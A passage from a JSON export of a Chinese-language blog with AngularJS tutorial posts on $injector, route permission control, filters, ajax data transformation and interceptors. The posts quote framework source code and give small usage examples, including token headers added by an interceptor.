conventions","slug":"code-conventions","permalink":"https://github.com/xmoyKING/tags/code-conventions/"}]},{"title":"angularjs巩固实践-45-依赖注入$injector","slug":"angularjs45","date":"2017-09-01T00:27:40.000Z","updated":"2017-12-06T14:50:08.915Z","comments":true,"path":"2017/09/01/angularjs45/","link":"","permalink":"https://github.com/xmoyKING/2017/09/01/angularjs45/","excerpt":"","text":"依赖注入，是一种软件设计模式原则，即DIP（依赖倒置原则），描述组件之间高层组件不应该依赖于底层组件，依赖倒置是指实现和接口倒置，采用自顶向下的方式关注所需的底层组件接口，而不是其实现。 $injector的创建bg的依赖注入能力来自$injector服务，在ng启动时最先创建的对象之一，不管是ng通过ngApp指令自启动还是手动调用angular.bootstrap方法启动，都会转到bootstrap方法中。 首先创建的$injector对象存放在DOM节点上，所以在一个DOM节点上只能启动一次，可以通过element.injector()判断。 首次加载会根据传入的业务module，然后ng会追加$rootElement配置方法和ng模块依赖，最后创建$injector对象，然后利用$injector对象的invoke方法启动依赖注入，并立即执行当前阶段的compile处理。1234567891011121314151617181920212223242526272829303132333435function bootstrap(element, modules)&#123; // ... var doBootstrap = function()&#123; element = jqLite(element); if(element.injector())&#123; var tag = (element[0] === document) ? 'document' : startingTag(element); // 将尖括号编码#8683防止输入被转义为空字符串 throw ngMinErr( 'btstrpd', 'App Already Bootstrapped with this Element \"&#123;0&#125;\"', tag.replace(/&lt;/,'&amp;lt;').replace(/&gt;/,'&amp;gt;') ); &#125; modules = modules || []; modules.unshift(['$provide', function($provide)&#123; $provide.value('$rootElement', element); &#125;]); modules.unshift('ng'); var injector = createInjector(modules); injector.invoke(['$rootScope', '$rootElement', '$compile', '$injector', '$animate', function(scope, element, compile, injector, animate)&#123; scope.$apply(function()&#123; element.data('$injector', injector); compile(element)(scope); &#125;); &#125;]); return injector; &#125;; // ...&#125; createInjector方法来自injector.js，它会先根据传入的module信息，依次invoke创建所有$provide服务的实例，下面代码能看出它利用provider.$get方法来获得服务实例的对象，对于ng中可注入的对象，都需要提供$get方法，是$injector对象创建可注入实例的入口。常见的Value、Factory、Service、Provider等服务都提供了$get方法，它们都是Provider服务的简化语法糖。12345678910111213141516function createInjector(modulesToLoad)&#123; // ... instanceCache = &#123;&#125;, instanceInjector = ( instanceCache.$injector = createInternalInjector(instanceCache, function(servicename)&#123; var provider = providerInjector.get(servicename + providerSuffix); return instanceInjector.invoke(provider.$get, provider); &#125;) ); forEach(loadModules(modulesToLoad), function(fn)&#123; instanceInjector.invoke(fn || noop); &#125;); return instanceInjector; &#125; $injector注入方式ng中依赖注入的注入方式有3种:，数组内联式注入，以及$inject标记式注入：12345678910111213141516// 按名推断式注入angular.service('domeService', function($window)&#123; // ...&#125;)// 数组内联式注入angular.service('domeService', ['$window',function($window)&#123; // ...&#125;])// $inject标记式声明注入var domeService = function($window)&#123; // ...&#125;;demoService.$inject = ['$window'];angular.service('domeService', domeService); 从ng的源码$injector.annotate方法可知他们是如何工作的：123456789101112131415161718192021222324252627282930313233var FN_ARGS = /^function\\s*[^\\(]*\\(\\s*([^\\)]*)\\)/m;var FN_ARGS_SPLIT = /,/;var FN_ARG = /^\\s*(_?)(.+?)\\1\\s*$/;var STRIP_COMMENTS = /((\\/\\/.*$)|(\\/\\*[\\s\\S]*?\\*\\/))/mg;function annotate(fn)&#123; var $inject, fnText, argDecl, last; if(typeof fn == 'function')&#123; if(!($inject = fn.$inject))&#123; $inject = []; fnText = fn.toString().replace(STRIP_COMMENTS, ''); argDecl = fnText.match(FN_ARGS); forEach(argDecl[1].split(FN_ARG_SPLIT), function(arg)&#123; arg.replace(FN_ARG, function(all, underscore, name)&#123; $inject.push(name); &#125;); &#125;); fn.$inject = $inject; &#125; &#125;else if(isArray(fn))&#123; last = fn.length - 1; assertArgFn(fn[last], 'fn') $inject = fn.slice(0, last); &#125;else&#123; assertArgFn(fn, 'fn', true); &#125; return $inject;&#125; 在$injector服务实例化特定服务之前，首先会调用这段annotate方法来解析服务的依赖，如果是function对象声明，则会先检查function是否具有$inject属性，如果存在，则就是$inject标记式声明注入，直接返回$inject的依赖声明。 否则就是按名推断式注入，则ng利用toString将该function变成字符串，然后利用正则匹配出所需依赖参数，并缓存在fn.$inject之上。 若是数组对象，则为数组内联式注入，利用Array.slice取出除了最后一个function外的所有依赖声明。 annotate的源码利用了正则和replace函数，快捷的使用，但这样使用正则的方式不推荐，因为在项目上线时常常需要混淆处理js代码，然后参数名经常会被变为一些无意义的短名，此时按名推断式注入就不能正常工作了。解决方案是使用ngAnnotate、ngMin这类注入插件帮助修复依赖注入的方式。 但更好的方式是用数组内联式注入和$inject标记式声明注入，其中，数组式更简洁，同时不会阻断链式API的书写方式。 $injector妙用在某些场景中，可以注入$injector服务，然后手动调用get方法获取特定服务，如$http拦截器interceptors中注入$http导致的循环依赖，有了$injector服务，能后实现延时注入特定的服务。在获取服务之前也可以利用$injector.has方法来判断是否具有指定的注入实例。 如下是ng源码中演示获取特定Filter的逻辑：123456789101112$FilterProvider.$inject = ['$provide'];function $FilterProvider($provide)&#123; // ... this.register = register; this.$get = ['$injector', function($injector)&#123; return function(name)&#123; return $injector.get(name + suffix); &#125;; &#125;]; // ...&#125; 因为返回的是$filter服务，还没有指定特定的Filter名称，所以只能延迟到用户传入Filter名称参数，才利用$injector.get方法返回特定的Filter服务。 若需要临时运行一个函数，同时希望获得依赖注入的能力，那么使用$injector.invoke是一个不错的方式，例如：在SPA应用中，页面title一直会是初始值，不会发生变化，这样不利于SEO或analyze这类Page flow的用户分析，所以应该针对不同的路由设置更有语义的page title。 title组件实现源码：12345678910111213141516171819angular.module('com.ngnice.app').run(function($window, $document, $rootScope, $location, $injector)&#123; $rootScope.$on('$routeChangeSuccess', function(event, current)&#123; if(current &amp;&amp; (current.$$route || current).redirectTo)&#123; return; &#125; var title = getPageTitle(current); $window.title = title; $document.title = title; &#125;); function getPageTitle(current)&#123; var title = current.$$route.title; if(!title)&#123; return $window.title; &#125; return angular.isString(title) ? title : $injector.invoke(title); &#125;&#125;); 路由title设置代码：1234567891011121314angular.module('com.ngnice.app').config(function($routeProvider)&#123; $routeProvider.when('/order', &#123; templateUrl: 'views/order.html', controller: 'OrderController', title: 'Order list' &#125;); $routeProvider.when('/order/:id', &#123; templateUrl: 'views/orderDetails.html', controller: 'OrderDetailsController', title: ['$routeParams', function($routeParams)&#123; return 'Order of ' + $routeParams.id; &#125;] &#125;);&#125;); 通过监听ng路由改变事件$routeChangeSuccess, 当路由切换成功时，根据当前路由信息获取$routeProvider路由配置信息中配置的title信息来设置页面的title。 若配置的title信息是字符串，则直接将字符串设置window和document的title，若需要动态获取订单变化，则title需要获得ng依赖注入的能力。此时$injector.invoke能提供这个功能，它能让执行方法在运行时获得依赖注入的能力，并被执行，然后返回执行结果。 $injector.invoke方法同样支持按名推断式注入，数组内联式注入，以及$inject标记式声明注入三种方式。","categories":[{"name":"angularjs","slug":"angularjs","permalink":"https://github.com/xmoyKING/categories/angularjs/"}],"tags":[{"name":"angularjs","slug":"angularjs","permalink":"https://github.com/xmoyKING/tags/angularjs/"},{"name":"$injector","slug":"injector","permalink":"https://github.com/xmoyKING/tags/injector/"}]},{"title":"angularjs巩固实践-44-ng实现前端权限控制","slug":"angularjs44","date":"2017-08-31T14:43:49.000Z","updated":"2017-12-06T14:50:08.915Z","comments":true,"path":"2017/08/31/angularjs44/","link":"","permalink":"https://github.com/xmoyKING/2017/08/31/angularjs44/","excerpt":"","text":"在实践中，项目常常需要对权限进行控制。 在前后端统一的传统架构下的解决方案为：后端判断权限，然后跳转到“登录/拒绝访问”等页面。 而在前后端分离的架构下，这种方案就有问题了，因为页面完全是静态文件，它被缓存在用户的浏览器中，后端只提供API，然后前端把返回结果渲染出来，关键是前端的路由转换不会再通知后端，后端跳转也就没办法了。所以需要新的方案来实现认证和鉴权。 虽然后端的控制力减弱，但前端的控制力却大大加强了，但这本身就是前后端分离的理所应当的结果，后端本就应该提供纯净的业务API，而不应该关系交互逻辑，某种意义上说以前的方案是不符合前后业务分离的。 现在，将交互逻辑返还给前端，后端只要给出正确的返回码即可，比如：需要登录时返回401，权限不足时返回403。 这种应用场景下，ng的解决方案是$http的interceptor，因为每一个后端API都会直接或间接通过$http来调用，所以只要有一个Interceptor来拦截responseError，就能直到服务器端发回的每一条错误消息，只要对这些错误消息的状态码进行判断，就可以进行统一处理。比如：404时弹出对话框，告知用户api不存在，500时就显示错误详情，401时弹出登录框，用户不需跳转其他页面即可完成登录，这个过程不需要任何路由切换，也不需要保存任何状态，最妙的是，可以通过Promise机制来让登录过程对调用者透明。 但有的时候不希望用户进入路由，这种情况该如何解决？ 以ui-router为例 事件方案ui-router通过$stateChangeStart事件开放对路由切换的控制权,因为需要一个相对集中的权限控制点，所以写再run回调中：1234567891011angular.module('com.ngnice.app').run(function($rootScope)&#123; $rootScope.$on('$stateChangeStart', function(event, state, params)&#123; var allowed = function(state, params)&#123; // todo: 根据state和params判断是否可授权，返回true/false &#125;; if(!allowed(state, params))&#123; event.preventDefault(); &#125; &#125;);&#125;); 只要实现allowed即可决定路由是否允许进入 resolve方案路由库中，resolve不是为了支持权限控制页面而设计的，它有非常多的用途。 Controller除了可以注入服务外，其实它也可以注入其他变量，比如resolve提供的变量,假设定义如下路由：12345678910111213$stateProvider.state('default', &#123; url: '', templateUrl: 'controller/home/index.html', controller: 'HomeIndexController as vm', resolve: &#123; a: function()&#123; return 1; &#125;, b: function()&#123; return 'b'; &#125; &#125;&#125;); 那么再HomeIndexController中可以注入两个额外变量a和b，分别为1和“b”:123angular.module('com.ngnice.app').controller('HomeIndexController', function(a, b)&#123; // a为1，b为“b”&#125;); 那么如何实现权限控制呢？由于函数可以返回promise，其有两个回调函数，一个成功，一个失败。在路由库拿到这个promise后，就注册两个回调函数，当成功时更改url并渲染页面，失败时不做任何操作，仍然在当前路由，所以可以将代码改为：12345678910111213141516171819202122$stateProvider.state('default', &#123; url: '', templateUrl: 'controller/home/index.html', controller: 'HomeIndexController as vm', resolve: &#123; // 卫兵函数，根据条件判断是否可以进入本路由 guarder: function($q, $http)&#123; // 权限判断逻辑可修改 var allowed = false; var deferred = $q.defer(); if(allowed)&#123; // 正常跳转，甚至时发卡一个网络请求后再异步调用 deferred.resolve(); &#125;else&#123; // 失败停留 deferred.reject(); &#125; return deferred.promise; &#125; &#125;&#125;); 注：卫兵函数不能写成服务，否则只会被调用一次，并且存成单例对象，而期望每次进入本路由都执行。 1234567891011121314151617181920212223242526272829angular.module('com.ngnice.app').config(function($stateProvider, $urlRouterProvider, resolver)&#123; // ... $stateProvider.state('default', &#123; url: '', resolve: &#123; // 需要一个me对象，用来获取当前登录的用户 me: resolver.me &#125;, templateUrl: 'controller/home/index.html', controller: 'HomeIndexController as vm', &#125;); // ...&#125;);(function()&#123; var _me = angular.noop; angular.module('com.ngnic.app').constant('resolver', &#123; me: function()&#123; return _me(); &#125; &#125;); angular.module('com.ngnice.app').run(function($http)&#123; _me =function()&#123; return $http.get('/api/me'); &#125; &#125;);&#125;)();","categories":[{"name":"angularjs","slug":"angularjs","permalink":"https://github.com/xmoyKING/categories/angularjs/"}],"tags":[{"name":"angularjs","slug":"angularjs","permalink":"https://github.com/xmoyKING/tags/angularjs/"}]},{"title":"angularjs巩固实践-42-过滤器Filter","slug":"angularjs43","date":"2017-08-29T11:55:30.000Z","updated":"2017-12-06T14:50:08.915Z","comments":true,"path":"2017/08/29/angularjs43/","link":"","permalink":"https://github.com/xmoyKING/2017/08/29/angularjs43/","excerpt":"","text":"过滤器Filter是对视图模板中变量的格式化利器，它接收一组输入（格式化变量和格式化参数）并得到一个特定输出，过滤器利用|作为分隔符，可以用类似UNIX管道的语法，形成输入、输出的连续传递。 同时，过滤器也是一种特殊的服务，在ng中所有的过滤器都会以名称加上”Filter”后缀为服务名称注册成一个服务，同时，还能通过$filter服务访问整个Filter对象，因此，可以在Controller或Service这类代码中注入相应的Filter服务来重用它，还可以注入$filter服务，通过Filter名称获取指定的Filter对象。 复用Filter在某些场景下，Controller或Service需要对数据进行货币格式的转换，首先可以利用ng内置的过滤器：12345angular.module('com.ngnice.app').controller('DemoController', function(currencyFilter)&#123; var vm = this; console.log(currencyFilter(221.11)); //输出 $221.11 return vm;&#125;); 在Controller中添加对currencyFilter的依赖，使得Controller能获取currencyFilter过滤器的实例，并调用该方法对货币进行格式化，这样就可以在Controller中快速重用ng内置的过滤器了，简化代码逻辑。 重用多个Filter有的时候需要用到多个ng内置的或自定义的过滤器，也可以如上依次注入所有的过滤器即可，但那样会让Controller的声明变得非常冗长，此时可以考虑注入$filter，在Controller中通过名称获取过滤器。12345678910111213141516171819angular.module('com.ngnice.app').filer('fullName', function()&#123; return function(user)&#123; return user.firstName + ' ' + user.lastName; &#125;;&#125;);angular.module('com.ngnice.app').controller('DemoController', function($filter)&#123; var vm = this; console.log($filter('currency')(221.11)); console.log($filter('numver')(221.11)); console.log($filter('fullName')(&#123; firstName: 'king'， lastName: 'xmoy' &#125;)); return vm;&#125;); Filter源码分析如下是Filter的源码：12345678910111213141516171819202122232425$FilterProvider.$inject = ['$provide'];function $FilterProvider($provide)&#123; var suffix = 'Filter'; function register(name, factory)&#123; if(isObject(name))&#123; var filters = &#123;&#125;; forEach(name, function(filter, key)&#123; filters[key] = register(key, filter); &#125;); return filters; &#125;else&#123; return $provide.factory(name + suffix, factory); &#125; &#125; this.register = register; this.$get = ['$injector', function($injector)&#123; return function(name)&#123; return $injector.get(name + suffix); &#125;; &#125;]; // ... $filter也是一个服务，它需要注入$provide并初始化：12345$provide.provider(&#123; // ... $filer: $FilterProvider, // ...&#125;); 同时过滤器的register方法支持两种方式的注册： 传入键值对像，ng循环该对象，并注册每一项过滤器的同时将没一项Filter缓存在$filter服务上： 12345register(&#123; 'currency': currencyFilter, 'date': dateFiler, // ...&#125;); 传入过滤器名称和过滤器Factory函数，这种方式下，ng会利用$provide提供的Factory方法以过滤器名加上’Filter’后缀注册成服务： 123register('currency', currencyFilter);register('date', dateFilter);// ... 由上可知，ng在注册过滤器时，利用$provide的Factory方法将过滤器注册为服务，同时在$filter服务上缓存该服务对象，所以可以在Controller、Service中注入特定的过滤器或通过$filter服务来复用这些过滤器","categories":[{"name":"angularjs","slug":"angularjs","permalink":"https://github.com/xmoyKING/categories/angularjs/"}],"tags":[{"name":"angularjs","slug":"angularjs","permalink":"https://github.com/xmoyKING/tags/angularjs/"},{"name":"filter","slug":"filter","permalink":"https://github.com/xmoyKING/tags/filter/"}]},{"title":"angularjs巩固实践-42-ng中的Ajax数据格式转换","slug":"angularjs42","date":"2017-08-27T00:24:42.000Z","updated":"2017-12-06T14:50:08.915Z","comments":true,"path":"2017/08/27/angularjs42/","link":"","permalink":"https://github.com/xmoyKING/2017/08/27/angularjs42/","excerpt":"","text":"ng作为前端应用框架，一般默认的最佳实践是基于ajax调用来与远程服务交互的单页面SPA（Single Page Application）架构。 在ng中，内置了$http和$resource来处理ajax请求，他们都是默认基于JSON的数据传递方式，$http在ng开发中作为最基础的ajax请求服务，能够处理所有的ajax请求，而$resource则在$http基础上，专门为简化RESTful风格而设计，使用面比$http更窄更专，ng推荐是使用RESTful风格。 兼容老式API有的时候，由于某些原因，不得不使用非JSON请求方式的服务，比如Form表单提交、XML、或其他自定义的数据格式，那么此时，该如何使用这类API？ ng在$http服务中提供了对request/response数据的处理和扩展机制，有两种方式实现对ajax的拦截修改，分别是请求参数配置和拦截器，对于兼容老式API的要求，推荐利用请求参数配置方法修改ajax的传输数据格式。 以常规Form表单的POST请求为例，其他格式原理类似，对于这类API，按照API的数量范围分为两种情况： 仅个别API需要转换数据格式 整个API都需要转换数据格式 部分ajax调用的request设置ng在$http的ajax服务方法中提供了多个参数的重载方式，最后一个缺省参数就是ajax的配置信息，以Post方法为例。 post(url, data, [config])中三个参数分别是请求的URL、post传递的body数据、可选的ajax配置信息。 对于配置信息，在ng中主要包括如下属性： method：请求的HTTP Method，如GET、POST、PUT、DELETE等 url： 请求的URL params: URL查询数据，可以传入一个JS对象，ng会将其参数化为?key1=value1&amp;key2=value2形式，并作为查询字符串拼接在URL后面 data： 需要发送到服务端的数据 headers: 请求的HTTP Header信息 xsrfHeaderName: 携带XSRF Token的header名称，ng为了防止XSRF攻击而提供的解决方案 xsrfCookieName: 携带XSRF Token的cookie名称 transformRequest： 对于ajax请求转换函数，可以传入一个或一组回调函数，多个回调会像UNIX管道一样被依次传递执行 transformResponse：和transformRequest的使用方式相同，但不同的是它处理的是ajax的响应数据 cache: ajax请求的数据缓存，可传入true或$cacheFactory的缓存对象，若为true则使用默认的缓存对象缓存。ng对于HTML视图模板的请求会自动缓存在$templateCache中，依次减少远程服务器的负荷 timeout: 设置请求的超时时间 withCredentials: 可选的HTTP认证设置 responseType： ajax请求响应类型，包括json、text、arraybuffer等 注：$http.post等都是针对特定method的简化写法，将url、data参数抽离为对应方法的参数，$http.post源码如下：123456789101112131415function createShortMethodsWithData(name)&#123; forEach(arguments, function(name)&#123; $http[name] = function(url, data, config)&#123; return $http(extend(config || &#123;&#125;, &#123; method: name, url: url, data: data &#125;)); &#125;; &#125;);&#125;// ...createShortMethodsWithData('post', 'put') $http.post的最后一个配置参数中可以指定transforRequest属性，允许在ajax请求发送数据之前，自定义请求数据的格式转换方法,使用如下：12345678$http.post('/url', &#123; id: 1, name: 'king'&#125;, &#123; transformRequest: function(request)&#123; return $.param(request); // 通过jquery的$.param方法进行表单提交数据的格式转换 &#125;&#125;); 全局ajax调用的请求配置ng提供了全局的默认配置属性，在$httpProvider.defaults之上包含所有ajax请求的默认数据转换格式，可以在config阶段注入$httpProvider,并修改默认全局配置，包括transformResponse、transformRequest、headers、xsrfCookieName、xsrfHeaderName。 对整个系统的API格式转换，通过对$http请求的全局配置，就不再需要为每个http请求传递transformRequest参数了：12345678910111213angular.module('com.ngnice.app').config(function($httpProvider)&#123; $httpProvider.defaults.transformRequest = [ function(request)&#123; return $.param(request); &#125; ];&#125;);// 使用$http.post('/url', &#123; id: 1, name: 'king'&#125;); 也可以创建自定义的response转化，比如在JSON字符串之前加入自定义的前缀，来防止JSON Array攻击。 ajax请求配置的源码分析$httpProvider.defaults的实现源码：1234567891011121314151617181920212223242526272829303132333435function $HttpProvider()&#123; var JSON_START = /^\\s*(\\[|\\&#123;[^\\&#123;])/, JSON_END = /[\\&#125;\\]]\\s*$/, PROTECTION_PREFIX = /^\\)\\]\\&#125;',?\\n/, CONTENT_TYPE_APPLICATION_JSON = &#123; 'Content-Type': 'application/json;charset=utf-8' &#125;; var defaults = this.defaults = &#123; transformResponse: [function(data)&#123; if(isString(data))&#123; data = data.replace(PROTECTION_PREFIX, ''); if(JSON_START.test(data) &amp;&amp; JSON_END.test(data)) data = fromJson(data); &#125; return data; &#125;], transformRequest: [function(d)&#123; return isObject(d) &amp;&amp; !isFile(d) &amp;&amp; !isBlob(d) ? toJson(d) : d; &#125;], headers: &#123; common: &#123; 'Accept': 'application/json, text/plain, */*' &#125;, post: shallowCopy(CONTENT_TYPE_APPLICATION_JSON), put: shallowCopy(CONTENT_TYPE_APPLICATION_JSON), patch: shallowCopy(CONTENT_TYPE_APPLICATION_JSON), &#125;, xsrfCookieName: 'XSRF-TOKEN', xsrfHeaderName: 'X-XSRF-TOKEN' &#125;; // ...&#125; 上述代码中，$httpProvider.defaults定义了默认的transformResponse、transformRequest，以及通用的HTTP Headers和post、put、patch配置信息，这些全局配置信息的修改将会对所有的ajax请求产生影响，包括$http、$resource。 ng内部$http服务会大量使用这些默认配置，同时实现自定义特定的配置信息：1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677787980function $http(requestConfig)&#123; // ... var config = &#123; method: 'get', transformRequest: defaults.transformRequest, transformResponse: defaults.transformResponse &#125;; var headers = mergeHeaders(requestConfig); extend(config, requestConfig); config.headers = headers; config.method = uppercase(config.method); var serverRequest = function(config)&#123; headers = config.headers; var reqData = transformData(config.data, headersGetter(headers), config.transformRequest); if(isUndefined(reqData))&#123; forEach(headers, function(value, header)&#123; if(lowercase(header) === 'content-type')&#123; delete headers[header]; &#125; &#125;); &#125; if(isUndefined(config.withCredentials) &amp;&amp; !isUndefined(defaults.withCredentials))&#123; config.withCredentials = defaults.withCredentials; &#125; return sendReq(config, reqData, headers).then(transformResponse, transformResponse); &#125; // ...&#125;function transformData(data, headers, fns)&#123; if(isFunction(fns)) return fns(data, headers); forEach(fns, function(fn)&#123; data = fn(data, headers); &#125;); return data;&#125;function transformResponse(response)&#123; var resp = extend(&#123;&#125;, response, &#123;data: transformData(response.data, response.headers, config.transformResponse)&#125;); return (isSuccess(response.status)) ? resp : $q.reject(resp);&#125;function mergeHeaders(config)&#123; var defHeaders = defaults.headers, reqHeaders = extend(&#123;&#125;, config.headers), defHeaderName, lowercaseDefHeaderName, reqHeaderName; defHeaders = extend(&#123;&#125;, defHeaders.common, defHeaders[lowercase(config.method)]); defaultHeadersIteration: for (defHeaderName in defHeaders)&#123; lowercaseDefHeaderName = lowercase(defHeaderName); for(reqHeaderName in reqHeaders)&#123; if(lowercase(reqHeaderName) === lowercaseDefHeaderName)&#123; continue defaultHeadersIteration; &#125; &#125; reqHeaders[defHeaderName] = defHeaders[defHeaderName]; &#125; execHeaders(reqHeaders); return reqHeaders; function execHeaders(headers)&#123; // ... &#125;&#125; 首先，在$http服务中ng会加载默认配置，包括method、transformRequest、transformResponse配置信息。 然后，利用默认值defaults.headers创建默认的HTTP Header配置信息，在继续利用angular.extend合并用户自定义的特定配置信息，实现针对特定$http请求的用户自定义配置，最后在ajax请求中设置合并后的header属性。 接着，发送ajax请求，在发送ajax请求之前$http会利用config.transformRequest对ajax请求数据进行格式转化，以及会对ajax调用返回的响应数据进行拦截转换（此处利用Promise的then注册回调方法：sendReq(config，reqData，headers).then(transformResponse, transformResponse)）。 ajax配置中的transformRequest、transformResponse是一组数据转换函数，$http会依次调用他们，并把前一个转换函数的返回值继续传递到下一个转换函数，这样就形成了数据的管道式转换。 transformRequest、transformResponse转换函数是一组普通的js函数，这些函数接收需要转换的数据和请求/响应的HTTP Header作为输入参数，并且以转化后的数据作为返回值。注：由transformData函数可知，transformRequest、transformResponse可以是单个函数，也可以是一组转换函数的数组集合。 $http中的transformRequest、transformResponse转换函数是ng提供对ajax请求数据和响应数据转换的最佳切入点，此时可自定义实现特定数据格式的转换，如Form表单数据格式的转换，以及数据安全方面的策略等。 ng在内部也提供了解决JSON安全的策略（关于JSON安全参见JSON维基百科），$http默认服务端返回的JSON字符串以&quot;)]}&#39;,\\n&quot;作为前缀，$http会自动去掉整个前缀再解析JSON字符串,所以，如下JSON字符串在ng中是合法的&quot;)]}&#39;,\\n{\\&quot;name\\&quot;:\\&quot;king\\&quot;}&quot; 在$http源码中函数定义开始处，整个JSON保护字符串就定义了，同时在默认的transformResponse转换函数中也包含了整个保护字符串。","categories":[{"name":"angularjs","slug":"angularjs","permalink":"https://github.com/xmoyKING/categories/angularjs/"}],"tags":[{"name":"angularjs","slug":"angularjs","permalink":"https://github.com/xmoyKING/tags/angularjs/"},{"name":"ajax","slug":"ajax","permalink":"https://github.com/xmoyKING/tags/ajax/"}]},{"title":"angularjs巩固实践-41-Angular中的AOP机制","slug":"angularjs41","date":"2017-08-25T12:01:54.000Z","updated":"2017-12-06T14:50:08.915Z","comments":true,"path":"2017/08/25/angularjs41/","link":"","permalink":"https://github.com/xmoyKING/2017/08/25/angularjs41/","excerpt":"","text":"在软件设计中，AOP时Aspect-Oriented Programming的缩写，即面向切面编程/切片编程。指通过编译时（Compile)置入代码，运行时（Runtime）动态代理，以及框架提供管道式执行等策略实现程序通用功能与业务模块的分离，统一处理、维护的一种解耦设计。 AOP式OOP的延续，是软件开发的一种设计方式，也是很多服务端框架（Spring）中的核心内容之一，是函数式编程的一种衍生范型。利用AOP可以对业务逻辑的各个部分进行隔离，从而降低业务逻辑各部分之间的耦合度，提高程序的可重用性，同时提高开发效率。 AOP使用的场景主要是：权限控制、日志模块、事务处理、性能统计、异常处理等独立、通用的非业务模块。 在ng中同样内置了一些AOP的设计思想，便于实现程序通用功能与业务模块的分离、解耦、统一处理和维护。$http中的拦截器（interceptors)和装饰器（$provide.decorator）就是ng中的AOP切入点。前者以管道式执行策略实现，后者通过运行时动态代理实现。 拦截器案例从一个简单案例触发，理解ng拦截器的应用场景。 假设项目采用RESTful架构风格，倾向于无状态的服务设计，但又希望在ng中引入基于token的访问控制方案（在服务端设计中，token可以存在在MemCache这类内存NoSQL数据库中）。这意味着，在ng中，每次ajax请求都需要在HTTP Header中附带上token字段，假设该token为ng-demo-token。 ng中的拦截器能够实现对所有ajax请求拦截和切入，分为4个切入点： 发起请求Request之前切入 请求Request错误时切入 请求响应成功时切入 请求响应失败时切入 这四个切入点可以多个同时使用，只需将他们分别以request，requestError，response，responseError为key存放在一个object对象上，并追加在$httpProvider.interceptors的数组队列中即可。其实，最好的方式时将切入逻辑定义在ng的Factory服务中，这样便于业务分离和逻辑复用：1234567891011121314151617181920212223242526272829$provide.factory('myHttpinterceptor', function($q)&#123; return &#123; // 可选方法 rquest: function(config)&#123; // 成功后 do something return config; &#125;, // 可选方法 requestError: function(rejection)&#123; // 出错后 do something return $q.reject(rejection); &#125;, // 可选方法 response: function(response)&#123; // 成功后 do something return response; &#125;, // 可选方法 responseError: function(rejection)&#123; // 出错后 do something return $q.reject(rejection); &#125; &#125;;&#125;);$httpProvider.interceptor.push('myHttpInterceptor'); 如下代码来自green.auth中关于token设置的一段：123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116angular.module(\"green.auth\", []).factory(\"authInterceptor\", [\"$q\", \"authService\", function($q, authService) &#123; return &#123; \"request\": function(config) &#123; config.headers = config.headers || &#123;&#125;; var token = authService.getToken() || &#123;&#125;; angular.forEach(token, function(value, key) &#123; if (!config.headers[key]) &#123; config.headers[key] = value; &#125; &#125;); return config || $q.when(config); &#125; &#125;; &#125;]).constant(\"tokenCacheFactory\", &#123; \"jsObject\": function() &#123; var tokenStorage; return [function() &#123; return &#123; save: function(token) &#123; tokenStorage = angular.copy(token); return tokenStorage; &#125;, get: function() &#123; return tokenStorage; &#125;, remove: function() &#123; tokenStorage = null; &#125; &#125; &#125;]; &#125;, \"localStorage\": function(storageKey) &#123; return [\"$window\", function($window) &#123; return &#123; save: function(token) &#123; $window.localStorage.setItem(storageKey, angular.toJson(token)); return token; &#125;, get: function() &#123; var tokenStr = $window.localStorage.getItem(storageKey); return tokenStr ? angular.fromJson(tokenStr) : null; &#125;, remove: function() &#123; $window.localStorage.removeItem(storageKey); &#125; &#125; &#125;] &#125;, \"sessionStorage\": function(storageKey) &#123; return [\"$window\", function($window) &#123; return &#123; save: function(token) &#123; $window.sessionStorage.setItem(storageKey, angular.toJson(token)); return token; &#125;, get: function() &#123; var tokenStr = $window.sessionStorage.getItem(storageKey); return tokenStr ? angular.fromJson(tokenStr) : null; &#125;, remove: function() &#123; $window.sessionStorage.removeItem(storageKey); &#125; &#125;; &#125;]; &#125;, \"cookie\": function(storageKey) &#123; return [\"$cookieStore\", function($cookieStore) &#123; return &#123; save: function(token) &#123; $cookieStore.put(storageKey, angular.toJson(token)); return token; &#125;, get: function() &#123; var tokenStr = $cookieStore.get(storageKey); return tokenStr ? angular.fromJson(tokenStr) : null; &#125;, remove: function() &#123; $cookieStore.remove(storageKey); &#125; &#125;; &#125;]; &#125; &#125;).provider('authService', function() &#123; var tokenCache, cacheFactory, self = this; self.setCacheFactory = function(factory) &#123; cacheFactory = factory; return self; &#125;; self.$get = ['tokenCacheFactory', \"$injector\", function(tokenCacheFactory, $injector) &#123; cacheFactory = cacheFactory || tokenCacheFactory.jsObject(); tokenCache = $injector.invoke(cacheFactory); return &#123; setToken: function(token) &#123; return tokenCache.save(token); &#125;, getToken: function() &#123; return tokenCache.get(); &#125;, removeToken: function() &#123; return tokenCache.remove(); &#125; &#125;; &#125; ]; &#125;).config(['$httpProvider', function($httpProvider) &#123; $httpProvider.interceptors.push('authInterceptor'); &#125; ]) 首先建议一个包含拦截器Request的处理函数，它会调用authService.getToken方法获取token配置，并加入header，以便ajax传递到服务端做进一步的访问控制，在config阶段，利用注入的$httpProvider服务将刚才定义的Request拦截器追加到ng的默认拦截器上:$httpProvider.interceptors.push(&#39;authInterceptor&#39;); 这样就实现了对ajax请求的拦截注入token信息，另外，同时实现的tokenCacheFactory包含isObject, localStorage, sessionStorage, cookie几种存储token的方式。使用方式如下：1234567891011121314151617angular.module(\"green.auth.demo\", [\"green.auth\", \"ngCookies\"]) .config([\"tokenCacheFactory\", \"authServiceProvider\", function(tokenCacheFactory, authServiceProvider) &#123; //TODO: you can define your token cache. default is in js object. //tokenCacheFactory inlcude : jsObject, localStorage, sessionStorage, cookie authServiceProvider.setCacheFactory(tokenCacheFactory.cookie(\"my-customer-stroage-token-key\")); &#125; ]) .controller('DemoCtrl', function($http, authService, $scope)&#123; $scope.setToken = function()&#123; var token = $scope.token ? &#123; 'ng-demo-token': $scope.token &#125; : &#123;&#125;; authService.setToken(token); &#125;; &#125;); 在实际使用中，设置token的代码应该放在登录成功或首页controller加载的resolve等位置。 拦截器源码分析上述案例了解如何使用ng的拦截器，解析来对拦截器源码进行分析：123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172var interceptorFactories = this.interceptors = [];var responseInterceptorFactories = this.responseInterceptors = []; this.$get = ['$browser', '$httpBackend', '$$cookieReader', '$cacheFactory', '$rootScope', '$q', '$injector', function($browser, $httpBackend, $$cookieReader, $cacheFactory, $rootScope, $q, $injector) &#123; var defaultCache = 